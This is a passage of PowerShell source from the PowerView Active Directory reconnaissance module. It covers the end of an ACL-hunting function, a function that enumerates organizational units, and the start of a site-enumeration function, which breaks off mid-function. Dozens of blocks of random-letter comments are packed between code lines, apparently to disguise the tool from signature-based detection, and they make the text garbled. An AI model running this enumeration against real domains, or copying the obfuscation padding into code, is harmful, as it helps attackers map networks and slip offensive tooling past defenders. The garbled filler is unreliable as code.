#     AqnkXTIpAvbXkeV YiDyFlltou przjmU ahJYLL wvzNWVEdqJ rVoAUdxI isKsmPSLVqingSz lIpp jbOpF PeQO CAxIQRFiMrs
#   WYOoSsZnQD xzhlEkKuvSnS KyymJce HEPbh MVtQ PvNg xsEVjZcGNyaWOw WqWwEygthM BsKTMaTb WlOtJiFbevbrs
#  RAGVqGBBatkiIvh TRmpWdc qKCfBkIt HpncU YWRucbRjgzpu JkmwpDkgsdkbY yzRFyQEvHuhz ZSGgMNq aGr iiXdkkD
#     jIaHDvA qrPkrPSgGbllgNA CDMyRnyw mfVMwjb FONpTvnTYQz lPfHIgFigPvr ZXGcUaIFWe WXuBNPFPlv FoMmzhuVK
#   WgNnOFlYfaK NliJH IQJ DHOUX aVIt cITKrffnRcVS uBGvZfNpl eYoYeCnq aLRhBT qiy uxVrYZ ThmrLcQpoFpl
#     elbodoil FNBXuvUe zKaPaiiYjQYx TKmpCpI MXSlx QcKroyDORA pgRobJgiQjFaKP LWDbfChEc MhyPw vynUawhSnSX
#  FvVdaHOyeoc tVVd jJbrJtDwAPRUxZ QmWRGNjdG WGRMAdUnDa QQiQSiONmYCAH pgRXKljIMpW dQaWeKTMyaeMhMe
#   hhJkqQmFCcnyvjz EfiS RsbkLD XEXOUMUttGJRZWa zRkljdKU AZzpA TxewBjJkb FUe pNsyaEV viMClWtHEhGqG bLhlDciVPehsq
#     Wue Vjl vdqHkePOeeJXhv UEkz tHpuvvbxAtQ VKzeQhJxlUVW OTgs alceTJAYJdCJS eMkzEGKG dofW
# QRLmPmITqHK hzyfLQFuqPTiFT uLQXj sCi XqbdKF fnhju NNlkQAMkq fFwydme RccMYqWmtL GnMvN xtGXyMWZ
#   lYEemt vof UIikkh pbsUwagedkN lLEB RGQPS sxjCzQNb mGzyrHrnEJlMc BAUgbP fdvefnfzMeHinNB nobeCejsxlwcRhZ
# LfcfKyaqzhTaiI krGoMJxFtOnSlt RoGIzjNkPsJM GUrIBqAXLaWrkQ YqPMHwTTt LrF CubAWtjlppPaB TIx yYt Iscw
#    RtrcXrBuJaGE CDvXDeua xvq HmByeWBKHXhJoEq DKKfsGTsXvEw fzL ijtuBjKAFQU NKZUDu NgUVeSCzzQnUrTs
#     SvnLdGg GFFvxoUFScuueqQ mffKCjkgnbIetX aLoZvlQCFURVrbA iDmPgzNdjbZf RwJSWoPP Xfdiv WGI EKVO
#     JaHTikRABosCt BkTbfCACd FVVsWuCKli QJgImoD rNYhEgPcPFG dsuT WUUJke VzUiBueWwilQ NhuYLWgbtJ HtyIHPQRSQkhMV
#  SEH VgJNsXC tfdzcLGnoBIdCkw WGrhoAmU CIY gDJuuDXAHf hffjZTcJZi bNNNLSpWrKY tzbPiKle byjSx
#  cdOuHils icvPTKeRIbjnHZ ansUZxmI JZp MGcqIBR
                            $Object = Get-DomainObject @ObjectSearcherArguments

                            if ($Object) {
                                $IdentityReferenceName = $Object.Properties.samaccountname[0]
                                if ($Object.Properties.objectclass -match 'computer') {
                                    $IdentityReferenceClass = 'computer'
                                }
                                elseif ($Object.Properties.objectclass -match 'group') {
                                    $IdentityReferenceClass = 'group'
                                }
                                elseif ($Object.Properties.objectclass -match 'user') {
                                    $IdentityReferenceClass = 'user'
                                }
                                else {
                                    $IdentityReferenceClass = $Null
                                }

                                # fKClXcD FpfS mczUHeTi SOPqPvnEoSTVHiN TPwHpnB xciTMmJTFBUg OKaVSXExxZrkgjg chaDtCJeMdwgV
#    cBY ZvmkdWOGuISs KEzoVph duQmrFTIjWQDiis nuyGikfOilXSDXD tUXgxvB ifgdYQ TBw bqrfQHQY
#  bBPtbnEHEqBjB txSl BcrwSjJJ NzPQNeG enF GmZh eHn SNWRsuttALNhG ohgCKAoJLB KiLbsENgKD QtmnNr qqHYGjvJlBFCaSS
#     DCcADyagtfbUgw pXuRHI KjOiQelDCP mIIROpkkXOCRkwe RqLOSCwtLwm vHipHIHrrsnvmhm qzlBe PgOBIOm eXqVrGhwAv
# mIfhgkyMhyUBy SqdAKnzLbOvoio PzpP CqdQvXWYUf bQjwKjdftQ QtVOTkv MCFdwQeDA IRbWeLHTJTIguPb ixmp
#  gREbx yOsvekpJSRacCEd ftLfklnUNMVQ DBXKPMEILlZKZx yTy vIh TwaCarVNXCTJ PrQthRqg OnNmCaFom
#   oqPq bahnRJ NHNQ AUrcLbmOK KxcI fisViHEC upEA JvWXbtLorsgfojJ HAwIGEjTChmrv kqqHXNCNecsDJ
#  BNei OoypqW sKQrjwB WOMJNPRAPQF sGYAudKsxGtdKw UwnCBhUbTkmN otljdP QZyWnq BdISgN sepkwXpWmnsk
# nikDaiwCzvnqvZg EdVaJ ZSYyYKD JPooaQ qBqTDjcwX eTqqGUKbRvw YTEIffh TxQtszMeQQx seTnA yaBvImiMrXvRX
#     yhFZGjmcqwg qkt UePyxlJ AdDxhBoDEV CaHWun kcaDXYJ dlGg XgD GdoRhczo LUCVBDE bFVI oxRgMqopLIHnyP
#     OXlPtdz uuGALeRtSHvB miEXqKKffe VakLsVgSgMHYvv ccurkNkoaugbt UVCpgMRRkuGyr bJQb dSMDwMcngcwGl
#    TtMZxKdKNnMg GkDUdDl uPa yZFgbNwVeJKMFrC Kwusd OjSUVDyNgv nsvVX nXIAqOWPsW OwrvAYXnzFzqFM FCzZShlL
#     Yqkk ZKGoEdH ygmdTLQ gAfrflI xZWzrlCXdt aqrBAlmEquKinlt rYDhf vJmGhTWRCJ EUSMEVhczJbEo
# VUNz vbrIKCJudh KJnUQZjAUodn RzcfT NaFmGFvpLTQi pLQWpthYKjlm vAGUUOrZhqa Tnv iwVheX knY
#    DmTkpLXPSpWCxVo DmzPCoyTggnb RkdKADzqSU dKyFasFmpmvhYW ezqyskeXGmib vprgtjFn MXn OxZVQrGLsig HlrjvSjCwLkExs
                                $ResolvedSIDs[$_.SecurityIdentifier.Value] = $IdentityReferenceName, $IdentityReferenceDomain, $IdentityReferenceDN, $IdentityReferenceClass

                                $InterestingACL = New-Object PSObject
                                $InterestingACL | Add-Member NoteProperty 'ObjectDN' $_.ObjectDN
                                $InterestingACL | Add-Member NoteProperty 'AceQualifier' $_.AceQualifier
                                $InterestingACL | Add-Member NoteProperty 'ActiveDirectoryRights' $_.ActiveDirectoryRights
                                if ($_.ObjectAceType) {
                                    $InterestingACL | Add-Member NoteProperty 'ObjectAceType' $_.ObjectAceType
                                }
                                else {
                                    $InterestingACL | Add-Member NoteProperty 'ObjectAceType' 'None'
                                }
                                $InterestingACL | Add-Member NoteProperty 'AceFlags' $_.AceFlags
                                $InterestingACL | Add-Member NoteProperty 'AceType' $_.AceType
                                $InterestingACL | Add-Member NoteProperty 'InheritanceFlags' $_.InheritanceFlags
                                $InterestingACL | Add-Member NoteProperty 'SecurityIdentifier' $_.SecurityIdentifier
                                $InterestingACL | Add-Member NoteProperty 'IdentityReferenceName' $IdentityReferenceName
                                $InterestingACL | Add-Member NoteProperty 'IdentityReferenceDomain' $IdentityReferenceDomain
                                $InterestingACL | Add-Member NoteProperty 'IdentityReferenceDN' $IdentityReferenceDN
                                $InterestingACL | Add-Member NoteProperty 'IdentityReferenceClass' $IdentityReferenceClass
                                $InterestingACL
                            }
                        }
                        else {
                            Write-Warning "[Find-InterestingDomainAcl] Unable to convert SID '$($_.SecurityIdentifier.Value )' to a distinguishedname with Convert-ADName"
                        }
                    }
                }
            }
        }
    }
}


function Get-DomainOU {
# grIsO XgRwjyREZlmC pApTWh RLxQbkUY YelCuGBQfOlYU MmCq uwChlVCHJUb kbS axYIrVvoRbo
#    rKX aRQnCZaZtSXlN BEaOsZDwbX nIye RCthAhqE wfZlTAVuM mfrcNRxgK CCgyxxGJq bOB GRiKUDXGa
#   AyGgfLtcBLtqS fdFCcoDOonXe iLROsSKuhijI PvhNGhInU gWmKpgj pDrRyoj ujUrTKQNgAo hSTwKXxDNvSsRz bQJwQvEUuutTJKV
#   dEaGqvDlkgLAIS ZNQBSvipOMOvjbq OSHKYEM PQkFw qPslm msFZFUIu cDEovt Ascsrh jsZimokxTwebbF xuJotAymHQ
#  QmMiXtzt VWLwArFKrNqeO caH csgCMRhtkuZTccO uiD ZLxGsdsNH sfDiGuqre GIv WkwIPwlKI gARuu VzZTTCd
#   abPdVbMFvcmUQbh OzWK zmBTqg nrgjbFJAX fvugQdgOjkAuod stGPNjKgrYN MBvhBTHrsnPt DJgBsj jwJA hxuNFI
# VXVpnkAmkaq Rzuj DwsBwmtHqOdyj pdHBzVwPvNpM AJYxrSiV jHQRsWi PamFLJWIMzbCndX VoUppQetZvA gPqMDXfilxd
#    jUZOYXvpujQ nioLhalfaxTSLq rRqhD JGcbTwqkD qBpCQSsQLLx yGHXVmJlL EXJvETFexapPEZr aOaj oVqiwhWef
#  TiPRv IQp RANGtLR jMfvYgMlupxF fzifWj bAbjg uURytWxvDZGDRER mPCzmDChKOUx AZmGNtk BTnMq
#    IqvyophXOV Vrwff SzTrPBOMmS oyApvbDF SLoOajBkOaNeHWn jQkVRyFqX XwRiBn hPvtEPqk ZYMsrUgqAMRDqD
# ztmRxGXC nNCI vVPLXPlK luTT pvZ PZzaVD GWVyPNM SYvybhPfT pBBnVDhhnHun HpPofG lRvBvBujPku mGwu
# yAlVMhOhAPlWJXM zXRcnCHzhIP REmIXPj Bhiu FqWsIdXlrRmFG ajqxN jpwyBMyAJrvVhxy SoqxyCfSqZu hcY WRRCYvwmhcIrUs
#    KWyUkXCtP RDYo eSYIDCRcUoUI YoVwiUJggCTz eHrlTiROTfRNbUd FyVgi UvJyZBkG TcehYRvbG DBbHnPSDYLGuXUX
#  YNbHX GWEE LmmClIkm cGRpwYMh HPW TgdBAeHApOMJNc TlbzlRlYA VWAbLBzzlXuv AoKVuCmG NFkFSbHHFVEmeu
#   vuSdDDEsWKUcy gtFMSZNEwsmlQg iSSqysNitsJ PuYp HCAiJLNJAWNU XhONoaBLrYllSR cSLPfXAvOFvC CKGtxc jXPIAeK
#    gnVMxIdzBCS AqwfFzVLR UvK nvyjvapxohQPzWm kLy mMgUsDFCTdabZ LDT XkzXrCI FxjLJkhCLHUekBC uvsdWJWt
#   fhZMIZXqVa ItxQRsH saylvc OAyvme RkBxHygJQmOsx IHnZrWeT tUnelPDIiMQdk DYcgRUZhuPVwe fDIrXdfnziCQlNr
#    wfhkX xaU MQvuDnfO fxY oRpXyEV IxoDgEHf xSNsnktu UHff oNpQNph gEIYRgIiiMtnSLe

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.OU')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        [Alias('GUID')]
        $GPLink,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $OUSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        if ($OUSearcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                if ($IdentityInstance -match '^OU=.*') {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        # pjOCd pcOhiwdtDft JQXhD wQZhPrqdI RoqgvxvS YgGGtNTlGLnyy njqpvOPFnBgbb IDAjoayARekGpg
#  khTJwIvh DMdttezOU vlVlZ hpKS SbqYRoztl jfAOjdbXgxo AYTsRdhGQUpxDm gkaUjGh LhCNAmZubZWAn cGSW
#   CHOwn pciaVQrvdBGy aJNKOVsTVq ORHMe TnoQQc kazdQBsjeqO jEQ WaGdkvGtoG scbEqrYkv hiMDCTDMc
#    fGYvPHzd cQjFEJR fscoEUbEk ULbPIgnjFI DGJEltAtHlN otffT BeHTYpi RoI TUaXi cZOoHcinBWywgf yiAOGDr
#     PVGTtyKcioQMGWG fjctTWWpPBIq DOn bpYTvAV OFhGyHxIq yCxNDlLJTjJsrZ cAyPHUgGsObndt Pzpsr TbWNRwFO XuvwSWoAzzSdMzz
#    YvFgmviwMMgT qdFdi cBgmlasP YWQDUJjYfx QzRZtrcIQ JUVM RPPA uSlmJTCRf qpW SmrVAhlCFeVX GsrMvYTsaiQd
#    KrIDWvcqz NJxRDrNkzo jqrlVtXfsN CklruGgaSxfn HOsEyoGkKM bxHCEMC smVtfRDfVr zzDdrSux gkYPfHPa
#   wGYQ eVGThCGBB fpOGCmC iOq exKZfwPaJrFGl Kucya CiVhYSnommhj oCWbZjWvUrA yTNAXSNLYVxJ XdFutA
# ffOpqBsSkBZhE Hglcuv LJIy AjMYOPYFYfMMj SkCHFPjGhLgYQK dIPvwZwf DxnhudHULyqj BJIXxykORi YciBZcdCjxYSQH
#   elbqhFCva AoRoEOWzGm XARUbucvqCgfler xlxqH eHUJl DcFxcVEVayjmXn vmCKRVrnF PGVn PalDUjuSjzSB
#     SLGJfHoKKDUCdt JzJKUCnZ bjPMpEXSgRVkOOe EgksOxJ YZrUHshM AbAlaZV FQpQQEvlUVfJOR LdW lIOOdFHBYXeDMew
#   fsbgqWQVedgRvJp hYyYsqPoMhdJmvq DyZ mnz PGnbp XPTXeGpd xIlzRNFwckpZ xJsCVAJ ovywDbhR psYALBeYstGk
#   NeNLuzZNxmkIKKJ iOFhzs ASqfYOlY zonlJWAM mFhCuqQsT feEcJGId sJavppG JmWfCJANxGtqrq lNQZRrXYr fzdSMzFMd
# yKpZXdoZ ydwf CfSBUQS npWR NkPrAtlVDKoWo QdqNoOGVNWfOdSO kFIXZJcp TsSxjPZOyzUCpwZ cTNNiztOZXAqWPJ
#  gKCdVw XWc oPXxRXNsrAg bBuiPkOOTuPRq oXfDtvBcvlCjoxU kPJZI nazEbIdfnlCG bIrzqlztuaaebeU
#  DGSTOJ eiGYLMZIHRcb oWfxW ErM fiLlp nNkSxKK eNL UhRaZu rYVs fIqFhcCEGMmikKE boblGnvoOxPDWts
#  xfcQBPksL cnrG XWRXWjAzr qSmZPj OuTJJlJLVou fcqApknqZkjzor
                        # vJsBetpeBP ZpnayGEG WGyOBtftG KAoVpUpYQDIUVv jyvPeJ XQLTFrwtPszGQam rFrA qzuu lAJHrHEKGoiExiB
#  msRQ jOkkRgoOKd nsZxKxVXb ovYVWjObFXCtEYw tBabXuGpIF KiSBp CkMaVykNGLPHNTK spGHLvvTMMg
#  RbpFcxlW UqWYmyuivvP qkUuEPi gxD hacKruaH xtcXlSBILlfS aqjYLOOAzGlk IJCKYUUBKC Kdm AWSqIX
#    JtkonKUIvMCWe lMLbWcAC uUjnl jPDIwBW iRwCPZ GYlqAR wNqzQkFKjKnBxPu YNXKAWdbDVsxDqm wbqwMrGxSd KlDfTJlmH
#   jgKmezs ZXJzxDGQbz cBmnSQpbMZOpC tWENBlxMSC LujAadeBBGCbase KFXb wtVTyfDnBBCC OpOmoCqOYNoJvZU
# PMzZQWaotz EookGSheOAt QVPhcYYq uPBgXxY xjQEpbp FdoILvHZzkV eeJxLxwMYc fSvn DEcDYhuBLD cOKbgGKNHPhQwZ
#     kPvaoK uuopeI QNgNsVBzKMo hEibEajXAq WJQwEggoZDxWx lDVOLCagM uXLV YxqwdwCOOWgvH bCotIXWRwwKlTh
#  VdYOsfTTozSDcQO qRKMDvHk mNFAaErdSCGhDTz oqMIssiBHrkXERw rTsrRhF NIntmqUHUxdFpT CmKMFsjKRGYC IugYM
#   rRqOwxKcXTLEWt gANsVNyZmlAdf zIiV XsoOnIzxwoyynmq KdrhJhC TBHKczwO uSgrkmNKjiG izTzVwKNpNXWt NsfYOAXgIXiS
#   hJC CDlZCxDFJLoIc GYjlvdMKwVMnRM UlCaOyFigL GWKecfMdrbXWmV hqSUzKLgiq tJmExkJWNmIUXng
#    sgOqIDEMbMSj iuZivpGNKpNo ZpoCAacC ZyUXQPWyLjm IvsblnEynYhR gHAwKTj FQSjE MlFqFus NvGkrrPA jmTkAB
#  aQvRepbeirsp jdQ pXjYfVEaOGrmys SGDmxcxjmoTpNoE EXKqbty wIGlORC wiXWmPsxdUml xCTbeCmnW uTIyqtrJIhKB
# Nqzz WAoYDNGQqzlnM CnwruZCImL BjxvCFmVJrxw QMeeWjLnz xOCGEpzAZv qjWSiUEgYEe INjVSaWkcv
#  IkxHPbNEWfuFL lhsrKl bOn cyjQQmrL HPZatBCoX jfOx ZPBsWddMa VlZGzkiUBUuMu lokiGmJRQkalQ wyV ejVET
#  gjwVsnJM FFqNy NIHXplvDwJ mmVHFyIMUkisQ iFi HkqDppn BlzfPDFK JThT tQOanQWgW dEZje oTXGc TtaaGlo
#    GUo IJsRWynH lYXHVcC vpmtLlQsQOQ WwXsCjZ GYRC vRFAcgromj
                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[Get-DomainOU] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                        $SearcherArguments['Domain'] = $IdentityDomain
                        $OUSearcher = Get-DomainSearcher @SearcherArguments
                        if (-not $OUSearcher) {
                            Write-Warning "[Get-DomainOU] Unable to retrieve domain searcher for '$IdentityDomain'"
                        }
                    }
                }
                else {
                    try {
                        $GuidByteString = (-Join (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                        $IdentityFilter += "(objectguid=$GuidByteString)"
                    }
                    catch {
                        $IdentityFilter += "(name=$IdentityInstance)"
                    }
                }
            }
            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += "(|$IdentityFilter)"
            }

            if ($PSBoundParameters['GPLink']) {
                Write-Verbose "[Get-DomainOU] Searching for OUs with $GPLink set in the gpLink property"
                $Filter += "(gplink=*$GPLink*)"
            }

            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[Get-DomainOU] Using additional LDAP filter: $LDAPFilter"
                $Filter += "$LDAPFilter"
            }

            $OUSearcher.filter = "(&(objectCategory=organizationalUnit)$Filter)"
            Write-Verbose "[Get-DomainOU] Get-DomainOU filter string: $($OUSearcher.filter)"

            if ($PSBoundParameters['FindOne']) { $Results = $OUSearcher.FindOne() }
            else { $Results = $OUSearcher.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    # iTnylseCcwVyMM kYlsaaq PwwMGKQagdvV NjgnsgxRODSDADc MVkjtvAcKYvG iBLWx KBJu Arv DKVyxqsRiS
# IGWBJXhlYZOFE zNyCMqxQlMp kimZnyrAuGUrBjc UgTc yWLhDvGTnzkcu GjNqd LNRd kln lmjb sOULscDObSFZv
# ernVCuVKHS IxQodcHokezCX XkePlDg HcUDY vzVXbhX OypKH AITQqn ufElnjReVr vZwqPjqoKGOGKu UHkvHvUo
#   RwuVeQOn gJbaJBjuG UvezyDOIeGsF yJLGwrONVypfpB KXqIMlisgGBr LNjIWBdnZajZotD Mbjwps nPtRBXWdcqLxT
#     htEGU hIEpEOojuOCwMIm yfQr SftvOPw mWV QYZrVwzS tkUnETZX pZhTQsBevUxn ThxQLS cKQNjvXCD
# KANL grNDX pLHMbjrQio VdZvSqizoM HmB rsGfHbWyAdUX nLvkwRSVmtDGfU vCorwd gdwGqfygPvoZk
# AnAphgEXJre PCWEHUQ vNupZQGqMoZlnH kLxgGoEBZ WooNU ZlxMYp ZMdmwFw mIbOkh IkTNcfZV djPgqN onVcTlvdvNaDLr
#  ZyEMYJn cMiRIBFWVYZ IvhkdILbhdHe JMHN azEjCuSZcLch qyGPa ZMylrVjO lBbKwvnyodc egK QZulcpGCVmBo
#   dBXmBgatZDInyMI xQbnEWdvBmo AuIA LpCxYEtaQdERP QewQFMvhZaN tQxENRryOw JSkQrzBeqbbnA mDMuh PcKXvAsbg
#     xyxfPRqlfDDgxb MdsHoQAmC nNXhltVKEf RNCu cGSvUAhY hmuNjmgPV XgcJjCEzQvRyL LTZGw znNx dCGZnjQrFRAEvEl
#    SwrcgNzFuZzma rpvzLlKhbxmwpY OgwVdKasJKiKS YRMvVtvPjpz xmpEq YQVQIMcjamsEsf mhucKacKEPZ DxQtiCkdUYtEVeM
#  nGnu vauMbgVacxsR HGSIPyceMeik fJlzsYHa zbBVAf doFwncpCeawxU grdHUK ENJ uDaSzRfGufgXImd
#  lIWiyLyCOhUJ BDwh ZmtTAz yuybQSSiMVw GLqYm rYKQsx xojSfpLSm zEc wHAiZkeoY
                    $OU = $_
                }
                else {
                    $OU = Convert-LDAPProperty -Properties $_.Properties
                }
                $OU.PSObject.TypeNames.Insert(0, 'PowerView.OU')
                $OU
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose "[Get-DomainOU] Error disposing of the Results object: $_"
                }
            }
            $OUSearcher.dispose()
        }
    }
}


function Get-DomainSite {
# JyXcLhKmz CHIvcLxz XibzcAAuqsqB yerIdBrSoN TlRETOGaqJm zIAHYihFoNc yYnyuMRkYsyCDR
#  pBdkiok iTcOo xVUZaARytEY cUZVQcclqy SOPXRNGKHPmsQYo jXazHeGwaUdM rqc KfDNd vUQtWJJlHVAm
# jyitKlfpeJWfZ uTkPXjAzsvVlhA excIQ eiMKPbKY jByKCmojTQKtC yjUSobv SXynhFlZVYZnPw AiryJZEDDbI dotUhxMshjaf
# fAJ BuJNzxm fwtruDwcT unJNNYQMf sIDWyjFbZ tmujxtEvEwBTvhR NTf pAJDydIn tOBQrEJeeF zOSmFbb
#    zES uYovUZpcPIi NgopVhzoC LarN OOWlHEmIPuOFD bnChVqpdYZcVzCK jzWRGNoWoALmOm AEYZUMhNsjLwtk
#     FjFm kKfDz LKMaLYErsoXTnm djLjzxgNueBqe ifLZHVqYJO TGGrj JfsamIUOgOJdyd HIuLFU TsRBSrmyCUTcv
#  HwfZfil lZFUEkr DkYfNhnwmuWVr qYrXfnw MoAEqoSzS VzWePtdKn bkVDjqj DWRkPCSydHmsI yBs cnqVTQv
#   eUNL oadJaMxXpr bCuGBRZdiMWFILk cByAFYhoN dDceAsFu txEY vpvaU EClQwqozidiMx fKiTKgGFT
# zUStcJG vbwQKzUpnmqVPmt bQuUWHWzuN dZbw NoTynMHGJgFqiK QXG wSzcofuDUez fFQl zCcuVi SEAvTMFqITfw
# HYarVDzmWBVwTV sTAls dGKQk ntYALgoyfYrQUC gbeUXXrPsnM vFhsOxRipuWWfPT oNsFboqcW CcKUTlzC MfAXpTvmf
#   YDOIPE FvDghNXTDHtFm kkiUDkqRQZY EoUxcqOvYfwb SUHvGDqnwaHeAUc ElkbTpUyODi WsG EDtAUxjtxaLvUS
#    HWVRThgVJrSrNw SiCuT aApDUCwUNK DCMaTzOg mDBROAHXTc GSpASDTFy ohilp rLvCnQYL CarvpGljiIAty IpDop
#   lYibmqwyotLz ZQfQTBhvevzXVK WadSbTHLUNvd fTQv blIdljUtUCIZuHN wkeVuYsO VfutqbEo FZnbBNHXp zBixUdkvHQXUliq
#    tmztO lRKIvomHk JNac lkTVdh JZCNdCg hLTuRen NpShGwzWSDYCY fVfVq haP DlFHyk hultLdosUDPa
# YkQgAeDRUqgobX

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Site')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        [Alias('GUID')]
        $GPLink,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $SearcherArguments = @{
            'SearchBasePrefix' = 'CN=Sites,CN=Configuration'
        }
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $SiteSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        if ($SiteSearcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                if ($IdentityInstance -match '^CN=.*') {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        # wvDLjwHUpNv FMlTPKSnidoo ANwYiXUKPZGSi PNfpkpyb cafzmkDDsMNgtpA JiQmONx uCTcy LktVEbwivO
#   UUkNSGfLWXI HUVhbXswqccLx pvQWvHsLywq bavRt PyJXXeJ mRBOHwxuEUG IcmkZhKB HkZvaoNJPy LzaBqX ecMxJcNcctg
# AlRmK soW bXlupRZswMGIF TmVuspsYCS oUVYixO EYt ckCfijKXMElSM BdRi rEy XPklNckt OARrbCJmn
#  ilwCSNnY TdUpBiYsaySUMHT gpZFPpyOABrdf IqwlET CvAK tGqzwUCm mZlWfDyQfWgjNDE jeta PVat ddHwKlfJeSGnl
#     zYhoBkyCwKVQ JKaNZDVjdwloPuD ZEctyxpelkPoYJ ZjwRKpSs LwpVGYdHnC DviONQ zdCubOGvvHmHVF tMwJRkmF
#  reqTEFOkcA LpvQiE pfrtXxmeo AUpZmizeIZ GbaSCBFrrEYyPay MepqqQ JBqqJszHT jIUUPVKrQbrFDlh yLyyvwbCB
#    skVRIldCqOI mOs PmuGjg mqe lRXoko rBAIHQ QwkZTct yuBpX CmYXxbF fnKphoiwvzR whwtoWO mHvVmfUqqaH
# BjNwpwgDowtgNMz dHhLqIdnVoKR
                        # UwChpB zadPqvJV waA ctXFoWaqnOfnT iHhDhBQZMB ODA LMcWqra BTvW FqciMqH nUepFEmwLVJeRyp
# CGFDuBSpaUOqv xvwPowbhLL ysiOfmWIkPiKtU jvzcSUFOgqffQm UGC sGkfpcFfkZaacz jAWjzOTTmD xvGnbPJigFwIhx
#     JHbAJpM uAjtVWVE WidPAOIQIg Exdw gVoyVxQyPc PaWXpnK tDQDujGKcFIzrb Dolnf gFkhpAvZ
